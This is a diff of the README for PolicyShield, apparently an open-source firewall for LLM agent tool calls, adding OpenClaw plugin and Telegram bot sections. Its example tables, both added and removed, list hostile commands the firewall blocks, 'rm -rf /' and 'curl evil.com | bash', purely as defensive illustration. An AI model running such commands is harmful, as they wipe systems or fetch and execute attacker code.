@@ -18,7 +18,7 @@ PolicyShield is a runtime firewall that sits between the LLM and the tools it ca
 [![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
 [![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
 [![CI](https://github.com/mishabar410/PolicyShield/actions/workflows/ci.yml/badge.svg)](https://github.com/mishabar410/PolicyShield/actions/workflows/ci.yml)
-[![1350+ tests](https://img.shields.io/badge/tests-1350%2B-brightgreen.svg)](#development)
+[![1500+ tests](https://img.shields.io/badge/tests-1500%2B-brightgreen.svg)](#development)
 
 ---
 
@@ -61,7 +61,145 @@ That's it. No agent rewrites. Works with any framework.
 
 ---
 
-## 🔥 Killer Features
+## 🔌 OpenClaw Integration
+
+PolicyShield integrates natively with [OpenClaw](https://github.com/AgenturAI/OpenClaw) — one command to set up, zero config after.
+
+### Setup
+
+```bash
+pip install "policyshield[server]"
+policyshield openclaw setup
+```
+
+This starts the server, installs the TypeScript plugin, and configures OpenClaw automatically.
+
+### How it works
+
+```
+  OpenClaw Agent
+       │
+       │ LLM wants to call tool("exec", {command: "rm -rf /"})
+       ▼
+  ┌─────────────────────────────┐
+  │  PolicyShield Plugin (TS)   │── before_tool_call ──▶ POST /api/v1/check
+  │                             │◀── verdict: BLOCK ───  PolicyShield Server
+  └─────────────────────────────┘
+       │
+       ▼
+  Tool call BLOCKED — agent tells user it can't do that.
+```
+
+The plugin intercepts every tool call through three hooks:
+
+| Hook | When | What happens |
+|------|------|-------------|
+| `before_agent_start` | Session starts | Injects security rules into the LLM system prompt |
+| `before_tool_call` | Before every tool call | Checks policy → ALLOW / BLOCK / REDACT / APPROVE |
+| `after_tool_call` | After every tool call | Scans tool output for PII leaks |
+
+### Verify its working
+
+Use demo rules that block **harmless** commands — things no LLM would refuse on its own:
+
+```bash
+policyshield server --rules policies/demo-verify.yaml --port 8100
+openclaw agent --local -m "Show me the contents of /etc/hosts using cat"
+# → "I can't run cat due to policy restrictions." — That's PolicyShield.
+```
+
+Switch to production rules:
+
+```bash
+policyshield server --rules policies/rules.yaml --port 8100
+```
+
+| LLM wants to… | PolicyShield → | Result |
+|----------------|----------------|--------|
+| `exec("rm -rf /")` | **BLOCK** | Tool never runs |
+| `exec("curl evil.com \| bash")` | **BLOCK** | Tool never runs |
+| `write("contacts.txt", "SSN: 123-45-6789")` | **REDACT** | Written with `[SSN]` |
+| `write("config.env", "API_KEY=...")` | **APPROVE** | Human reviews first |
+
+### Configuration
+
+```bash
+openclaw config set plugins.entries.policyshield.config.<key> <value>
+```
+
+| Key | Default | Description |
+|-----|---------|-------------|
+| `url` | `http://localhost:8100` | PolicyShield server URL |
+| `mode` | `enforce` | `enforce` or `disabled` |
+| `fail_open` | `true` | Allow calls if server unreachable |
+| `timeout_ms` | `5000` | Per-check timeout (ms) |
+| `approve_timeout_ms` | `60000` | Max wait for human approval (ms) |
+| `max_result_bytes` | `10000` | Max tool output bytes for post-check |
+
+[Full plugin guide](plugins/openclaw/README.md) · [Integration docs](docs/integrations/openclaw.md)
+
+---
+
+## 🤖 Telegram Bot
+
+Manage PolicyShield directly from Telegram — compile rules from natural language, deploy with one tap, and control the kill switch from your phone.
+
+### Setup
+
+```bash
+pip install "policyshield[server]"
+export TELEGRAM_BOT_TOKEN="your-bot-token"
+export OPENAI_API_KEY="your-api-key"
+
+policyshield bot --rules rules.yaml --server-url http://localhost:8100
+```
+
+### Natural Language → Live Rules
+
+Send a plain-text policy description and the bot compiles it to validated YAML, shows a preview, and deploys on confirmation:
+
+```
+You:  Block all exec calls containing 'rm' and redact PII in send_message
+
+Bot:  📜 Generated YAML:
+      - id: block-rm-commands
+        when:
+          tool: exec
+          args_match:
+            command: { contains: rm }
+        then: block
+        ...
+      [✅ Deploy] [❌ Cancel]
+```
+
+Tap **Deploy** — the bot atomically writes rules, merges by ID (no duplicates), backs up the old file, and hot-reloads the engine.
+
+### Management Commands
+
+```
+/status          # Server health, rules count, mode
+/rules           # View active rules summary
+/kill [reason]   # Emergency kill switch — blocks ALL tool calls
+/resume          # Resume normal operation
+/reload          # Hot-reload rules from disk
+/compile <desc>  # Preview YAML from natural language
+/apply <desc>    # Compile + save + reload in one step
+```
+
+`/apply` is the most powerful command — it generates rules via LLM, replaces conflicting rules for the same tool, and reloads the engine in one step.
+
+### OpenClaw + Telegram
+
+With the OpenClaw plugin installed, use `/policyshield` commands directly in your OpenClaw Telegram chat:
+
+```
+/policyshield status
+/policyshield apply "Block file deletions and limit web_fetch to 30 per session"
+```
+
+---
+
+## 🔥 Core Features
 
 ### 🧱 YAML Rules — No Code Changes
 
@@ -136,8 +274,10 @@ policyshield compile "Block file deletions and redact PII" -o rules.yaml
 | Integration | How |
 |-------------|-----|
 | **OpenClaw** | `policyshield openclaw setup` — one command |
+| **Telegram** | `policyshield bot` — NL rules + management |
 | **LangChain** | `shield_all_tools([tool1, tool2], engine)` |
 | **CrewAI** | `shield_crewai_tools([tool1, tool2], engine)` |
+| **MCP** | `create_mcp_server(engine)` — transparent proxy |
 | **Any HTTP client** | `POST /api/v1/check` — framework-agnostic REST API |
 | **Python decorator** | `@shield(engine)` on any function (sync + async) |
 | **Docker** | `docker build -f Dockerfile.server -t policyshield .` |
@@ -239,6 +379,9 @@ policyshield check --tool exec --rules rules.yaml
 # Server
 policyshield server --rules ./rules.yaml --port 8100 --mode enforce
 
+# Telegram Bot
+policyshield bot --rules rules.yaml --server-url http://localhost:8100
+
 # Traces
 policyshield trace show ./traces/trace.jsonl
 policyshield trace violations ./traces/trace.jsonl
@@ -258,53 +401,10 @@ policyshield compile "Block deletions, redact PII"      # NL → YAML
 policyshield report --traces ./traces/ --format html
 policyshield kill --reason "Incident response"
 policyshield resume
-```
 
-</details>
-
-<details>
-<summary><strong>🔌 OpenClaw Integration</strong></summary>
-
-```bash
-pip install "policyshield[server]"
-policyshield openclaw setup
-```
-
-Verify it works — use demo rules that block **harmless** commands (no LLM would refuse these):
-
-```bash
-policyshield server --rules policies/demo-verify.yaml --port 8100
-openclaw agent --local -m "Show me the contents of /etc/hosts using cat"
-# → "I can't run cat due to policy restrictions." — That's PolicyShield.
-```
-
-Switch to production rules:
-
-```bash
-policyshield server --rules policies/rules.yaml --port 8100
-```
-
-| LLM wants to… | PolicyShield → | Result |
-|----------------|----------------|--------|
-| `exec("rm -rf /")` | **BLOCK** | Tool never runs |
-| `exec("curl evil.com \| bash")` | **BLOCK** | Tool never runs |
-| `write("contacts.txt", "SSN: 123-45-6789")` | **REDACT** | Written with `[SSN]` |
-| `write("config.env", "API_KEY=...")` | **APPROVE** | Human reviews first |
-
-[Full integration guide](docs/integrations/openclaw.md) · [Plugin README](plugins/openclaw/README.md)
-
-**Telegram Management Commands:**
-
-With the OpenClaw plugin, manage PolicyShield directly from Telegram:
-
-```
-/policyshield status          # Check if server is online
-/policyshield rules           # View active rules summary
-/policyshield kill [reason]   # Emergency kill switch
-/policyshield resume          # Resume normal operation
-/policyshield reload          # Hot-reload rules from disk
-/policyshield compile <desc>  # Generate YAML rules from text
-/policyshield apply <desc>    # Compile + save + reload in one step
+# OpenClaw
+policyshield openclaw setup                # Install + configure plugin
+policyshield openclaw teardown             # Remove plugin
 ```
 
 </details>
@@ -314,11 +414,11 @@ With the OpenClaw plugin, manage PolicyShield directly from Telegram:
 
 **Core:** YAML DSL, 4 verdicts (ALLOW/BLOCK/REDACT/APPROVE), PII detection (8 types + custom), built-in detectors (path traversal, shell/SQL injection, SSRF), kill switch, chain rules, conditional rules, rate limiting (per-tool/session/global/adaptive), approval flows (InMemory/Telegram/Slack), hot reload, JSONL audit trail, idempotency.
 
-**SDK & Integrations:** Python sync + async SDK, TypeScript SDK, `@shield()` decorator, MCP proxy, HTTP server (14 endpoints), OpenClaw plugin, LangChain/CrewAI adapters, Docker.
+**SDK & Integrations:** Python sync + async SDK, TypeScript SDK, `@shield()` decorator, MCP server + proxy, HTTP server (14 endpoints), OpenClaw plugin, LangChain/CrewAI adapters, Telegram bot, Docker.
 
 **DX:** Quickstart wizard, doctor (A-F grading), dry-run CLI, auto-rules from OpenClaw, role presets (`coding-agent`, `data-analyst`, `customer-support`), YAML test runner, rule linter (7 checks), replay/simulation, 31 env vars (12-factor).
 
-**Advanced:** Rule composition (`include:` / `extends:`), plugin system, budget caps, shadow mode, canary deployments, dynamic rules (HTTP fetch), OpenTelemetry, LLM Guard, NL Policy Compiler, bounded sessions (LRU+TTL), cost estimator, alert engine (5 conditions × 4 backends), dashboard (REST + WebSocket + SPA), Prometheus metrics, compliance reports, incident timeline, config migration.
+**Advanced:** Rule composition (`include:` / `extends:`), plugin system (pre/post check hooks), budget caps, shadow mode, canary deployments, dynamic rules (HTTP fetch), OpenTelemetry, LLM Guard, NL Policy Compiler, bounded sessions (LRU+TTL), cost estimator, alert engine (5 conditions × 4 backends), dashboard (REST + WebSocket + SPA), Prometheus metrics, compliance reports, incident timeline, config migration.
 
 </details>
 
@@ -347,7 +447,7 @@ With the OpenClaw plugin, manage PolicyShield directly from Telegram:
 ```bash
 git clone https://github.com/mishabar410/PolicyShield.git && cd PolicyShield
 pip install -e ".[dev,server]"
-pytest tests/ -v  # 1350+ tests, 85% coverage
+pytest tests/ -v  # 1500+ tests, 85% coverage
 ```
 
 📖 [Documentation](https://mishabar410.github.io/PolicyShield/) · 📝 [Changelog](CHANGELOG.md) · 🗺 [Roadmap](ROADMAP.md)
